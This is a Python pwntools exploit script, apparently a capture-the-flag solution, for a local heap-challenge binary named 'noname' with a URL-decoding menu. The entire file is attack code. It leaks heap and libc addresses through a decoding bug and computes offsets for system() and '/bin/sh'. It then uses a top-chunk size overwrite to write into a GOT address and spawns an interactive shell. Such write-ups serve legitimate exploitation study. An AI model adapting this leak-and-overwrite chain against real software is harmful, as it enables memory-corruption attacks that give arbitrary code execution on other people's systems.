from pwn import *

r = process("./noname")

def createURL(size, URL):
	r.sendline("1")
	print r.recvuntil("size: ")
	r.sendline(str(size))
	print r.recvuntil("URL: ")
	r.sendline(URL)
	print r.recvuntil("> ")

def decodeURL(idx):
	r.sendline("2")
	print r.recvuntil("index: ")
	r.sendline(str(idx))
	print r.recvuntil("> ")

def deleteURL(idx):
	r.sendline("4")
	print r.recvuntil("index: ")
	r.sendline(str(idx))
	print r.recvuntil("> ")

print r.recvuntil("> ")

raw_input("$")

createURL(16, "BBBB") # 3
createURL(16, "BBBB") # 2
createURL(9472, "\x00"*20) # 1
createURL(16, "BBBB") # 0

deleteURL(2)

createURL(16, "aaaaaaaaaaaaa%0")
decodeURL(0)

r.send("3\n")
r.recvuntil("aaaa")
r.recv(12)

heap = u32(r.recv(4)) - 0x1010
print "heap: " + hex(heap)

createURL(96, "b"*93 + "%" + "\x00")
createURL(100, "B"*100)

deleteURL(1)
createURL(0, "")

r.send("3\n")
print r.recvuntil("0: ")

libc = u32(r.recv(4))
libc_base = libc - 0x1b2810
system = libc_base + 0x3ada0
binsh = libc_base + 0x15b9ab

print r.recvuntil("> ")

print "libc: " + hex(libc)

#--------------------------
createURL(115700, "CCCC")

payload = "%41"*30
payload += "AAA%\x00\x00"

createURL(96, payload)
createURL(100, "\xff"*80)
deleteURL(0)

decodeURL(0)

top_addr = heap + 0x1fa98

addr = 0x804b00c - top_addr

print str(addr)
createURL(addr, "")

payload = p32(system)
payload += p32(libc_base + 0x5fca0)

createURL(400, payload)

r.send("1\n")
r.send(str(binsh - 0x100000004)+"\n")

r.interactive()
